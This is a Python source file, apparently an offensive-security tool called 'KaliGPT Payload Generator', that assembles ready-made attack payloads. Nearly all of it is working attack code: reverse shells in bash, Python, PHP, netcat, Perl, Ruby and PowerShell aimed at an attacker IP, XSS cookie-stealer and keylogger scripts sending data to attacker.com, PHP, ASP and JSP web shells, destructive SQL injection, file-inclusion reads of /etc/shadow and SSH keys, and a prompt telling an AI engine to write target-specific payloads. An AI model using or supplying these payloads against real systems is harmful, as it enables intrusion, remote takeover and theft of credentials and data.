#!/usr/bin/env python3
"""
KaliGPT Payload Generator
Generates various exploit payloads for penetration testing

Created by Yashab Alam
Instagram: https://www.instagram.com/yashab.alam
LinkedIn: https://www.linkedin.com/in/yashab-alam
"""

import base64
import urllib.parse
from typing import Dict, List, Optional
import secrets
import string
import json
import os
from pathlib import Path


class PayloadGenerator:
    """
    Generates exploit payloads for various attack vectors
    Supports template loading and AI-powered payload generation
    """
    
    def __init__(self, ai_engine=None):
        self.templates_dir = Path(__file__).parent / "templates"
        self.ai_engine = ai_engine
        self._load_templates()
    
    def _load_templates(self):
        """Load payload templates from JSON files"""
        self.templates = {}
        
        if not self.templates_dir.exists():
            return
        
        template_files = {
            'sqli': 'exploits/sqli_payloads.json',
            'xss': 'exploits/xss_payloads.json',
            'webshells': 'webshells/php_webshells.json',
            'reverse_shells': 'shells/reverse_shells.json'
        }
        
        for category, filename in template_files.items():
            filepath = self.templates_dir / filename
            if filepath.exists():
                try:
                    with open(filepath, 'r') as f:
                        self.templates[category] = json.load(f)
                except Exception as e:
                    print(f"[Warning] Failed to load template {filename}: {e}")
        
    def generate(self, payload_type: str, **kwargs) -> str:
        """
        Generate payload based on type
        
        Args:
            payload_type: Type of payload (sqli, xss, lfi, rce, etc.)
            **kwargs: Additional parameters for payload generation
                - use_template: Use template-based generation
                - target_info: Target information for AI-powered generation
                - ai_generate: Use AI to generate custom payload
            
        Returns:
            Generated payload string or dict
        """
        # Check if AI generation is requested
        if kwargs.get('ai_generate') and self.ai_engine:
            return self.generate_with_ai(payload_type, **kwargs)
        
        # Check if template-based generation is requested
        if kwargs.get('use_template'):
            return self.get_from_template(payload_type, **kwargs)
        
        generators = {
            'sqli': self.generate_sqli,
            'sql_injection': self.generate_sqli,
            'xss': self.generate_xss,
            'cross_site_scripting': self.generate_xss,
            'lfi': self.generate_lfi,
            'local_file_inclusion': self.generate_lfi,
            'rfi': self.generate_rfi,
            'remote_file_inclusion': self.generate_rfi,
            'rce': self.generate_rce,
            'command_injection': self.generate_rce,
            'reverse_shell': self.generate_reverse_shell,
            'web_shell': self.generate_web_shell,
            'php_shell': self.generate_php_shell,
            'privilege_escalation': self.generate_privesc,
            'ssti': self.generate_ssti,
            'xxe': self.generate_xxe,
            'csrf': self.generate_csrf,
            'upload_bypass': self.generate_upload_bypass,
        }
        
        generator = generators.get(payload_type.lower())
        if generator:
            return generator(**kwargs)
        
        return f"Unknown payload type: {payload_type}"
    
    def get_from_template(self, payload_type: str, **kwargs) -> Dict:
        """
        Get payloads from templates
        
        Args:
            payload_type: Type of payload
            **kwargs: Template variables and filters
            
        Returns:
            Dict of payloads from templates
        """
        result = {}
        
        # Map payload types to template categories
        template_map = {
            'sqli': 'sqli',
            'sql_injection': 'sqli',
            'xss': 'xss',
            'cross_site_scripting': 'xss',
            'web_shell': 'webshells',
            'php_shell': 'webshells',
            'reverse_shell': 'reverse_shells',
            'shell': 'reverse_shells'
        }
        
        category = template_map.get(payload_type.lower())
        if not category or category not in self.templates:
            return {"error": f"No templates found for {payload_type}"}
        
        # Get template data
        template_data = self.templates[category]
        
        # Apply variable substitution
        variables = {k: v for k, v in kwargs.items() if k != 'use_template'}
        result = self._substitute_variables(template_data, variables)
        
        return result
    
    def _substitute_variables(self, data, variables: Dict) -> Dict:
        """Replace template variables like {{VARIABLE}} with actual values"""
        if isinstance(data, dict):
            result = {}
            for key, value in data.items():
                result[key] = self._substitute_variables(value, variables)
            return result
        elif isinstance(data, list):
            return [self._substitute_variables(item, variables) for item in data]
        elif isinstance(data, str):
            # Replace {{VARIABLE}} with actual value
            import re
            def replace_var(match):
                var_name = match.group(1)
                return str(variables.get(var_name, match.group(0)))
            
            return re.sub(r'\{\{([A-Z_]+)\}\}', replace_var, data)
        else:
            return data
    
    def generate_with_ai(self, payload_type: str, **kwargs) -> str:
        """
        Generate custom payload using AI based on target information
        
        Args:
            payload_type: Type of payload to generate
            **kwargs: Target information and requirements
            
        Returns:
            AI-generated payload
        """
        if not self.ai_engine:
            return "AI engine not available"
        
        target_info = kwargs.get('target_info', {})
        
        # Build AI prompt
        prompt = f"""Generate a {payload_type} payload for penetration testing.

Target Information:
- OS: {target_info.get('os', 'Unknown')}
- Web Server: {target_info.get('web_server', 'Unknown')}
- Database: {target_info.get('database', 'Unknown')}
- Language: {target_info.get('language', 'Unknown')}
- WAF: {target_info.get('waf', 'None detected')}
- Vulnerabilities: {target_info.get('vulnerabilities', 'None')}

Requirements:
- Payload type: {payload_type}
- Attacker IP: {kwargs.get('attacker_ip', 'ATTACKER_IP')}
- Port: {kwargs.get('port', '4444')}
- Technique: {kwargs.get('technique', 'standard')}

Generate ONLY the payload code, no explanations. Make it specific to the target environment.
"""
        
        try:
            response = self.ai_engine.generate(prompt)
            return response.strip()
        except Exception as e:
            return f"AI generation failed: {str(e)}"
    
    def list_templates(self, category: str = None) -> Dict:
        """
        List available templates
        
        Args:
            category: Optional category filter (sqli, xss, webshells, reverse_shells)
            
        Returns:
            Dict of available templates
        """
        if category:
            return {category: self.templates.get(category, {})}
        return self.templates
    
    def generate_sqli(self, technique: str = 'union', **kwargs) -> Dict[str, str]:
        """
        Generate SQL injection payloads
        
        Args:
            technique: Technique type (union, boolean, time, error, stacked)
            
        Returns:
            Dict of SQL injection payloads
        """
        payloads = {}
        
        # Union-based
        if technique in ['union', 'all']:
            payloads['union_basic'] = "' UNION SELECT NULL--"
            payloads['union_columns'] = "' UNION SELECT NULL,NULL,NULL--"
            payloads['union_data'] = "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
            payloads['union_mysql'] = "' UNION SELECT NULL,user(),database()--"
            payloads['union_mssql'] = "' UNION SELECT NULL,@@version,db_name()--"
            payloads['union_oracle'] = "' UNION SELECT NULL,banner FROM v$version--"
        
        # Boolean-based
        if technique in ['boolean', 'all']:
            payloads['boolean_and'] = "' AND '1'='1"
            payloads['boolean_or'] = "' OR '1'='1"
            payloads['boolean_test'] = "' AND 1=1--"
            payloads['boolean_false'] = "' AND 1=2--"
        
        # Time-based
        if technique in ['time', 'all']:
            payloads['time_mysql'] = "' AND SLEEP(5)--"
            payloads['time_mssql'] = "'; WAITFOR DELAY '00:00:05'--"
            payloads['time_postgres'] = "'; SELECT pg_sleep(5)--"
            payloads['time_oracle'] = "' AND DBMS_LOCK.SLEEP(5)--"
        
        # Error-based
        if technique in ['error', 'all']:
            payloads['error_mysql'] = "' AND extractvalue(1,concat(0x7e,database()))--"
            payloads['error_mssql'] = "' AND 1=CAST((SELECT @@version) AS INT)--"
        
        # Stacked queries
        if technique in ['stacked', 'all']:
            payloads['stacked_mysql'] = "'; DROP TABLE users--"
            payloads['stacked_exec'] = "'; EXEC xp_cmdshell('whoami')--"
        
        # Authentication bypass
        payloads['auth_bypass_1'] = "admin' --"
        payloads['auth_bypass_2'] = "admin' OR '1'='1"
        payloads['auth_bypass_3'] = "' OR 1=1--"
        payloads['auth_bypass_4'] = "admin'/*"
        
        return payloads
    
    def generate_xss(self, context: str = 'html', **kwargs) -> Dict[str, str]:
        """
        Generate XSS payloads
        
        Args:
            context: Context where XSS will be injected (html, js, attribute, url)
            
        Returns:
            Dict of XSS payloads
        """
        payloads = {}
        
        # HTML context
        if context in ['html', 'all']:
            payloads['script_basic'] = "<script>alert('XSS')</script>"
            payloads['script_document'] = "<script>alert(document.cookie)</script>"
            payloads['img_onerror'] = "<img src=x onerror=alert('XSS')>"
            payloads['svg_onload'] = "<svg onload=alert('XSS')>"
            payloads['body_onload'] = "<body onload=alert('XSS')>"
            payloads['iframe_src'] = "<iframe src='javascript:alert(\"XSS\")'>"
        
        # JavaScript context
        if context in ['javascript', 'js', 'all']:
            payloads['js_escape'] = "'; alert('XSS');//"
            payloads['js_comment'] = "</script><script>alert('XSS')</script>"
        
        # Attribute context
        if context in ['attribute', 'all']:
            payloads['attr_break'] = "' onclick='alert(\"XSS\")' '"
            payloads['attr_event'] = "' onmouseover='alert(\"XSS\")'"
        
        # URL context
        if context in ['url', 'all']:
            payloads['url_javascript'] = "javascript:alert('XSS')"
            payloads['url_data'] = "data:text/html,<script>alert('XSS')</script>"
        
        # Filter bypasses
        payloads['bypass_uppercase'] = "<ScRiPt>alert('XSS')</ScRiPt>"
        payloads['bypass_encoding'] = "<%73%63%72%69%70%74>alert('XSS')</script>"
        payloads['bypass_double'] = "<<script>script>alert('XSS')<</script>/script>"
        
        # Advanced payloads
        payloads['cookie_stealer'] = "<script>fetch('http://attacker.com?c='+document.cookie)</script>"
        payloads['keylogger'] = "<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>"
        
        return payloads
    
    def generate_lfi(self, os: str = 'linux', **kwargs) -> Dict[str, str]:
        """
        Generate Local File Inclusion payloads
        
        Args:
            os: Target OS (linux, windows)
            
        Returns:
            Dict of LFI payloads
        """
        payloads = {}
        
        if os in ['linux', 'unix', 'all']:
            payloads['passwd'] = "../../../../../../etc/passwd"
            payloads['shadow'] = "../../../../../../etc/shadow"
            payloads['hosts'] = "../../../../../../etc/hosts"
            payloads['ssh_key'] = "../../../../../../home/user/.ssh/id_rsa"
            payloads['apache_log'] = "../../../../../../var/log/apache2/access.log"
            payloads['auth_log'] = "../../../../../../var/log/auth.log"
            payloads['proc_self'] = "/proc/self/environ"
        
        if os in ['windows', 'all']:
            payloads['win_ini'] = "..\\..\\..\\..\\..\\..\\windows\\win.ini"
            payloads['boot_ini'] = "..\\..\\..\\..\\..\\..\\boot.ini"
            payloads['sam'] = "..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam"
            payloads['hosts_win'] = "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        
        # Wrappers (PHP)
        payloads['php_filter_b64'] = "php://filter/convert.base64-encode/resource=index.php"
        payloads['php_input'] = "php://input"
        payloads['data_wrapper'] = "data://text/plain,<?php system($_GET['cmd']); ?>"
        
        # Null byte bypass
        payloads['null_byte'] = "../../../../../../etc/passwd%00"
        
        # Double encoding
        payloads['double_encoded'] = "..%252f..%252f..%252fetc%252fpasswd"
        
        return payloads
    
    def generate_rfi(self, attacker_ip: str = "ATTACKER_IP", **kwargs) -> Dict[str, str]:
        """
        Generate Remote File Inclusion payloads
        
        Args:
            attacker_ip: Attacker's IP address
            
        Returns:
            Dict of RFI payloads
        """
        payloads = {}
        
        payloads['basic'] = f"http://{attacker_ip}/shell.php"
        payloads['with_null'] = f"http://{attacker_ip}/shell.php%00"
        payloads['encoded'] = f"http://{attacker_ip}/shell.txt"
        
        # Data wrapper
        payloads['data_wrapper'] = "data://text/plain,<?php system($_GET['cmd']); ?>"
        
        # Remote shell content
        payloads['shell_content'] = "<?php system($_GET['cmd']); ?>"
        
        return payloads
    
    def generate_rce(self, target_os: str = 'linux', **kwargs) -> Dict[str, str]:
        """
        Generate Remote Code Execution payloads
        
        Args:
            target_os: Target operating system
            
        Returns:
            Dict of RCE payloads
        """
        payloads = {}
        
        # Command injection
        payloads['pipe'] = "; whoami"
        payloads['and'] = "&& whoami"
        payloads['or'] = "|| whoami"
        payloads['backtick'] = "`whoami`"
        payloads['dollar'] = "$(whoami)"
        
        # With encoding
        payloads['encoded_pipe'] = "%3B%20whoami"
        payloads['newline'] = "%0A whoami"
        
        # Filter bypasses
        payloads['concatenation'] = "who''ami"
        payloads['variable'] = "w$@hoami"
        
        if target_os == 'linux':
            payloads['cat_passwd'] = "; cat /etc/passwd"
            payloads['reverse_shell'] = "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        
        if target_os == 'windows':
            payloads['dir'] = "& dir"
            payloads['type'] = "& type C:\\windows\\win.ini"
        
        return payloads
    
    def generate_reverse_shell(self, attacker_ip: str = "ATTACKER_IP", 
                               port: int = 4444, shell_type: str = 'bash', **kwargs) -> Dict[str, str]:
        """
        Generate reverse shell payloads
        
        Args:
            attacker_ip: Attacker's IP address
            port: Listening port
            shell_type: Type of shell (bash, python, php, nc, etc.)
            
        Returns:
            Dict of reverse shell payloads
        """
        payloads = {}
        
        # Bash
        if shell_type in ['bash', 'all']:
            payloads['bash_tcp'] = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
            payloads['bash_exec'] = f"0<&196;exec 196<>/dev/tcp/{attacker_ip}/{port}; sh <&196 >&196 2>&196"
        
        # Python
        if shell_type in ['python', 'all']:
            payloads['python'] = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
            
            payloads['python3'] = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
        
        # PHP
        if shell_type in ['php', 'all']:
            payloads['php'] = f"""php -r '$sock=fsockopen("{attacker_ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
        
        # Netcat
        if shell_type in ['nc', 'netcat', 'all']:
            payloads['nc'] = f"nc -e /bin/sh {attacker_ip} {port}"
            payloads['nc_mkfifo'] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {port} >/tmp/f"
        
        # Perl
        if shell_type in ['perl', 'all']:
            payloads['perl'] = f"""perl -e 'use Socket;$i="{attacker_ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
        
        # Ruby
        if shell_type in ['ruby', 'all']:
            payloads['ruby'] = f"""ruby -rsocket -e'f=TCPSocket.open("{attacker_ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
        
        # PowerShell (Windows)
        if shell_type in ['powershell', 'ps', 'all']:
            payloads['powershell'] = f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{attacker_ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
        
        return payloads
    
    def generate_web_shell(self, language: str = 'php', **kwargs) -> Dict[str, str]:
        """
        Generate web shell payloads
        
        Args:
            language: Language for web shell (php, asp, jsp)
            
        Returns:
            Dict of web shell code
        """
        payloads = {}
        
        if language in ['php', 'all']:
            payloads['php_simple'] = "<?php system($_GET['cmd']); ?>"
            payloads['php_exec'] = "<?php exec($_GET['cmd']); ?>"
            payloads['php_passthru'] = "<?php passthru($_GET['cmd']); ?>"
            payloads['php_eval'] = "<?php eval($_POST['cmd']); ?>"
            payloads['php_shell_exec'] = "<?php echo shell_exec($_GET['cmd']); ?>"
            
            # Advanced PHP shell
            payloads['php_advanced'] = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>"""
        
        if language in ['asp', 'all']:
            payloads['asp_simple'] = """<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<%= getCommandOutput(Request.QueryString("cmd")) %>"""
        
        if language in ['jsp', 'all']:
            payloads['jsp_simple'] = """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr); 
        disr = dis.readLine(); 
    }
%>"""
        
        return payloads
    
    def generate_php_shell(self, **kwargs) -> str:
        """Generate full-featured PHP shell"""
        return """<?php
// Simple PHP Shell
error_reporting(0);
session_start();

echo "<html><head><title>Shell</title></head><body>";
echo "<form method='post'>";
echo "Command: <input type='text' name='cmd' size='50' autofocus/>";
echo "<input type='submit' value='Execute'/></form>";

if(isset($_POST['cmd'])) {
    echo "<pre>";
    $cmd = $_POST['cmd'];
    system($cmd);
    echo "</pre>";
}

echo "</body></html>";
?>"""
    
    def generate_privesc(self, target_os: str = 'linux', **kwargs) -> Dict[str, str]:
        """
        Generate privilege escalation scripts/commands
        
        Args:
            target_os: Target OS (linux, windows)
            
        Returns:
            Dict of privilege escalation payloads
        """
        payloads = {}
        
        if target_os in ['linux', 'all']:
            # SUID binaries
            payloads['find_suid'] = "find / -perm -u=s -type f 2>/dev/null"
            
            # Writable /etc/passwd
            payloads['check_passwd_write'] = "ls -la /etc/passwd"
            payloads['add_root_user'] = "echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd"
            
            # Sudo
            payloads['sudo_list'] = "sudo -l"
            
            # Capabilities
            payloads['find_capabilities'] = "getcap -r / 2>/dev/null"
            
            # Cron jobs
            payloads['check_cron'] = "cat /etc/crontab"
            payloads['check_user_cron'] = "crontab -l"
            
            # Kernel exploits
            payloads['kernel_version'] = "uname -a"
            payloads['os_version'] = "cat /etc/issue"
            
        if target_os in ['windows', 'all']:
            # Check privileges
            payloads['whoami'] = "whoami /priv"
            payloads['check_user'] = "whoami /all"
            
            # Services
            payloads['services'] = "wmic service get name,displayname,pathname,startmode"
            
            # Scheduled tasks
            payloads['schtasks'] = "schtasks /query /fo LIST /v"
            
            # Always install elevated
            payloads['check_alwaysinstall'] = "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
        
        return payloads
    
    def generate_ssti(self, template_engine: str = 'jinja2', **kwargs) -> Dict[str, str]:
        """
        Generate Server-Side Template Injection payloads
        
        Args:
            template_engine: Template engine (jinja2, twig, freemarker, etc.)
            
        Returns:
            Dict of SSTI payloads
        """
        payloads = {}
        
        if template_engine in ['jinja2', 'flask', 'all']:
            payloads['jinja2_rce'] = "{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}"
            payloads['jinja2_config'] = "{{ config }}"
            payloads['jinja2_read'] = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
        
        if template_engine in ['twig', 'all']:
            payloads['twig_rce'] = "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
        
        return payloads
    
    def generate_xxe(self, **kwargs) -> Dict[str, str]:
        """Generate XML External Entity payloads"""
        payloads = {}
        
        payloads['xxe_file'] = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
        
        payloads['xxe_ssrf'] = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
<foo>&xxe;</foo>"""
        
        return payloads
    
    def generate_csrf(self, target_url: str = "http://target/action", **kwargs) -> str:
        """Generate CSRF proof-of-concept"""
        return f"""<html>
  <body>
    <form action="{target_url}" method="POST" id="csrf-form">
      <input type="hidden" name="param1" value="value1" />
      <input type="hidden" name="param2" value="value2" />
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>"""
    
    def generate_upload_bypass(self, **kwargs) -> Dict[str, str]:
        """Generate file upload bypass techniques"""
        payloads = {}
        
        payloads['double_extension'] = "shell.php.jpg"
        payloads['null_byte'] = "shell.php%00.jpg"
        payloads['case_change'] = "shell.PHP"
        payloads['add_valid_ext'] = "shell.jpg.php"
        
        # Content-Type bypass
        payloads['content_type'] = "Change Content-Type to image/jpeg"
        
        # Magic bytes
        payloads['magic_bytes'] = "Add GIF89a or ÿØÿà JFIF to start of PHP file"
        
        return payloads


if __name__ == "__main__":
    # Test payload generator
    generator = PayloadGenerator()
    
    print("=== Standard SQL Injection Payloads ===")
    sqli = generator.generate('sqli', technique='union')
    for name, payload in list(sqli.items())[:3]:
        print(f"{name}: {payload}")
    
    print("\n=== Template-Based SQL Injection ===")
    sqli_template = generator.generate('sqli', use_template=True, TABLE='users', COLUMN='password')
    if 'union_based' in sqli_template:
        print("MySQL Extract payloads:")
        for payload in sqli_template['union_based']['mysql_extract']['payloads'][:3]:
            print(f"  {payload}")
    
    print("\n=== Template-Based XSS ===")
    xss_template = generator.generate('xss', use_template=True, ATTACKER_DOMAIN='attacker.com')
    if 'stored_xss' in xss_template:
        print("Stored XSS payloads:")
        for payload in xss_template['stored_xss']['persistent']['payloads'][:2]:
            print(f"  {payload}")
    
    print("\n=== Template-Based Reverse Shells ===")
    shells = generator.generate('reverse_shell', use_template=True, 
                                ATTACKER_IP='10.10.10.1', ATTACKER_PORT='4444')
    if 'bash_tcp' in shells:
        print(f"Bash TCP: {shells['bash_tcp']['code']}")
    if 'python_pty' in shells:
        print(f"Python PTY: {shells['python_pty']['code'][:80]}...")
    
    print("\n=== Template-Based Web Shells ===")
    webshells = generator.generate('web_shell', use_template=True, 
                                   SECRET_KEY='my_secret_key_123')
    if 'simple_shell' in webshells:
        print(f"Simple Shell:\n{webshells['simple_shell']['code']}")
    
    print("\n=== List Available Templates ===")
    templates = generator.list_templates()
    for category in templates.keys():
        print(f"- {category}: {len(templates[category])} template groups")
